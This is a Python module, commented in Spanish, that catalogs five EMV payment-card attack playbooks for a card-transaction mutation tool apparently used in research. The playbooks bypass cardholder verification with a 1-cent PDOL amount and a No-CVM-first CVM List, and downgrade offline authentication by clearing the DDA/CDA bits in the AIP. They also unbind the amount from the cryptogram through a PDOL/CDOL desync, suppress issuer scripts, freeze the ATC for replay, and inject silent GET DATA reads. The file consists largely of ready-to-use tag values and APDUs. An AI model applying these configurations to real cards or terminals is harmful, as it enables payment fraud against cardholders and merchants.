"""Playbooks COMBO: combinaciones curadas de mutaciones EMV (catálogo puro).

Traducción de los COMBO de atrium (`tmp/atrium/playbooks/COMBO-*.yaml`) a
dicts Python constantes — sin YAML, sin I/O. Cada playbook lleva `id`,
`title`, `description` (español, explica el vector), `config` (dict consumible
por `MutationConfig.from_dict`) y `attack_ref` (referencias ATTACK-x del
catálogo de atrium: ATTACK-1 importe+CVM bypass, ATTACK-2 TTQ, ATTACK-3
downgrade CDA/DDA, ATTACK-4 No-CVM forzado, ATTACK-5 recolección silenciosa,
ATTACK-6 IAC-Denial, ATTACK-7 manipulación AFL, ATTACK-8 desincronización
CDOL, ATTACK-9 ATC/Last Online ATC, ATTACK-10 divisa+país, ATTACK-11
supresión de issuer scripts).

Condiciones de disparo (copiadas de la lógica de los YAML de atrium):

* **COMBO-A (CVM-Bypass)** — requiere contactless (TTQ): PDOL con 1¢ en
  `9F02` + EUR en `5F2A` + TTQ `9F66=36004000` (criptograma online, sin PIN
  offline, sin MSD) y CVM List `8E` con No-CVM primero → el terminal aplica
  el umbral de importe No-CVM y salta el CVM. Las lecturas silenciosas de
  ATC/PIN recogen el estado tras el bypass.
* **COMBO-B (Offline-Auth-Defeat)** — AFL `skip_signed` (ningún registro en
  el ámbito de firma SDA/DDA) + AIP XOR `0x2100` (limpia DDA bit6 y CDA bit1)
  → el terminal queda degradado a SDA-only y no puede verificar offline.
* **COMBO-C (PDOL/CDOL desync)** — vector «novedoso» de su paper: PDOL
  `9F02=1¢` (CVM bypass) mientras `remove_field 9F02` en CDOL1 hace que el
  criptograma no quede ligado al importe; IAC-Denial a cero para que la
  tarjeta nunca decline offline.
* **COMBO-D (AFL-Truncate-CDOL-Strip)** — AFL truncado a 1 entrada (el
  terminal no lee los registros de CVM/risk data) + borrado de CDOL2 (`8D`)
  → se suprime el segundo GENERATE AC / el procesamiento de issuer scripts.
* **COMBO-E (ATC-Freeze-Silent-Inject)** — ATC `9F36` y Last Online ATC
  `9F13` congelados en `0001` (solo en respuestas GET DATA, INS `CA`) para
  investigación de replay/pre-play, más inyecciones silenciosas de lectura.
"""
from __future__ import annotations

_PLAYBOOKS: tuple[dict, ...] = (
    {
        "id": "COMBO-A",
        "title": "CVM-Bypass",
        "description": (
            "Bypass de CVM por umbral de importe en contactless: PDOL con "
            "1 céntimo (9F02), divisa EUR (5F2A) y TTQ online-only (9F66), "
            "CVM List con No-CVM primero (8E) y lecturas silenciosas de ATC "
            "y reintentos PIN tras GPO/GenAC."
        ),
        "attack_ref": ("ATTACK-1", "ATTACK-2", "ATTACK-4", "ATTACK-5"),
        "config": {
            "pdol": [
                {"tag": "9F02", "value": "000000000001",
                 "comment": "Importe: 1 céntimo — activa la regla de umbral No-CVM"},
                {"tag": "5F2A", "value": "0978",
                 "comment": "Divisa: EUR (0978) — sincronizada con el importe"},
                {"tag": "9F1A", "value": "0276", "enabled": False,
                 "comment": "País del terminal: Alemania (0276)"},
                {"tag": "9F66", "value": "36004000",
                 "comment": "TTQ: criptograma online, sin PIN offline, sin MSD"},
            ],
            "response": [
                {"tag": "8E", "mode": "replace",
                 "value": "00000000000000001F03",
                 "comment": "CVM List: No-CVM primero"},
            ],
            "injections": [
                {"trigger_ins": "AE", "when": "after_response", "apdu": "80CA9F3600",
                 "comment": "GET DATA: ATC (9F36) — lectura silenciosa tras GenAC"},
                {"trigger_ins": "A8", "when": "after_response", "apdu": "80CA9F1700",
                 "comment": "GET DATA: reintentos PIN (9F17) — lectura silenciosa tras GPO"},
            ],
        },
    },
    {
        "id": "COMBO-B",
        "title": "Offline-Auth-Defeat",
        "description": (
            "Derrota de la autenticación offline: AFL skip_signed (ningún "
            "registro queda en el ámbito de firma SDA/DDA) y AIP con XOR "
            "0x2100 que limpia los bits DDA/CDA — el terminal queda degradado "
            "a SDA-only."
        ),
        "attack_ref": ("ATTACK-3", "ATTACK-7"),
        "config": {
            "afl": [
                {"mode": "skip_signed",
                 "comment": "AFL: contador de autenticación offline a 0 — nada firmado"},
            ],
            "response": [
                {"tag": "82", "mode": "xor", "value": "2100",
                 "comment": "AIP: XOR 0x2100 limpia DDA (bit6) y CDA (bit1) — degrade a SDA"},
            ],
        },
    },
    {
        "id": "COMBO-C",
        "title": "PDOL-CDOL-Desync",
        "description": (
            "Desincronización PDOL/CDOL del importe (vector novedoso): el "
            "PDOL muestra 1¢ (bypass de CVM) pero CDOL1 ya no liga el "
            "importe al criptograma (remove_field 9F02), y con IAC-Denial a "
            "cero la tarjeta nunca declina offline."
        ),
        "attack_ref": ("ATTACK-1", "ATTACK-6", "ATTACK-8"),
        "config": {
            "pdol": [
                {"tag": "9F02", "value": "000000000001",
                 "comment": "Importe: 1 céntimo → bypass de CVM por umbral"},
                {"tag": "5F2A", "value": "0978", "enabled": False,
                 "comment": "Divisa: EUR (0978)"},
                {"tag": "9F1A", "value": "0276", "enabled": False,
                 "comment": "País del terminal: Alemania (0276)"},
                {"tag": "9F66", "value": "36004000", "enabled": False,
                 "comment": "TTQ: criptograma online, sin PIN offline"},
            ],
            "dol": [
                {"target_tag": "8C", "mode": "remove_field", "field_tag": "9F02",
                 "comment": "CDOL1: quitar Importe (9F02) — el AC no queda ligado al importe"},
            ],
            "response": [
                {"tag": "9F0E", "mode": "replace", "value": "0000000000",
                 "comment": "IAC-Denial: todo a cero — sin declives offline"},
            ],
        },
    },
    {
        "id": "COMBO-D",
        "title": "AFL-Truncate-CDOL-Strip",
        "description": (
            "AFL truncado a 1 entrada (el terminal no lee los registros de "
            "CVM/risk data) y borrado completo de CDOL2 (8D) — se suprime el "
            "segundo GENERATE AC y el procesamiento de issuer scripts."
        ),
        "attack_ref": ("ATTACK-7", "ATTACK-8", "ATTACK-11"),
        "config": {
            "afl": [
                {"mode": "truncate", "truncate_to": 1,
                 "comment": "AFL: truncar a 1 entrada — suprime registros de CVM y risk data"},
            ],
            "response": [
                {"tag": "8D", "mode": "delete",
                 "comment": "CDOL2: borrar — suprime el segundo GENERATE AC / issuer scripts"},
            ],
        },
    },
    {
        "id": "COMBO-E",
        "title": "ATC-Freeze-Silent-Inject",
        "description": (
            "Congelación de ATC y Last Online ATC en 0001 (solo en respuestas "
            "GET DATA, INS CA) para investigación de replay/pre-play, más "
            "inyecciones silenciosas de lectura de ATC/Last Online ATC y sonda "
            "de Log Format antes del SELECT."
        ),
        "attack_ref": ("ATTACK-5", "ATTACK-9"),
        "config": {
            "response": [
                {"tag": "9F36", "mode": "replace", "value": "0001", "on_ins": ["CA"],
                 "comment": "ATC: congelado en 0001 — replay / pre-play"},
                {"tag": "9F13", "mode": "replace", "value": "0001", "on_ins": ["CA"],
                 "comment": "Last Online ATC: igual al ATC — el emisor no ve offline"},
            ],
            "injections": [
                {"trigger_ins": "AE", "when": "after_response", "apdu": "80CA9F3600",
                 "comment": "GET DATA: ATC (9F36) — lectura silenciosa tras GenAC"},
                {"trigger_ins": "AE", "when": "after_response", "apdu": "80CA9F1300",
                 "comment": "GET DATA: Last Online ATC (9F13) — lectura silenciosa tras GenAC"},
                {"trigger_ins": "A4", "when": "before_command", "apdu": "80CA9F4F00",
                 "comment": "GET DATA: Log Format (9F4F) — sonda antes del SELECT"},
            ],
        },
    },
)


def playbooks() -> tuple[dict, ...]:
    """Todos los playbooks COMBO (tupla inmutable de dicts)."""
    return _PLAYBOOKS


def get_playbook(pb_id: str) -> dict | None:
    """Playbook por id (p.ej. "COMBO-A"); None si no existe."""
    pb_id = (pb_id or "").upper()
    return next((p for p in _PLAYBOOKS if p["id"] == pb_id), None)
